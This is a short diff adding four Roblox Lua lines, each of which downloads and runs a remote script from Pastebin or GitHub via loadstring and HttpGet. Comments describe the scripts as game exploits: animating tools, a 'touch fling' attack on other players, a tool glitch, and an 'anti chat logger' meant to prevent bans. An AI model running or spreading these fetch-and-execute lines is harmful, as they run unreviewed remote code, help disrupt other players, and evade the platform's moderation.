@@ -1,0 +1,4 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/s2PJu6EY"))() --print tools to animate
+loadstring(game:HttpGet("https://pastebin.com/raw/V7g9stn2"))() --touch fling - L
+loadstring(game:HttpGet("https://pastebin.com/raw/J4t6gMea"))() --MULTIPLE TOOL GLITCH
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua", true))() -- ANTI CHAT LOGGER, PREVENT BANS
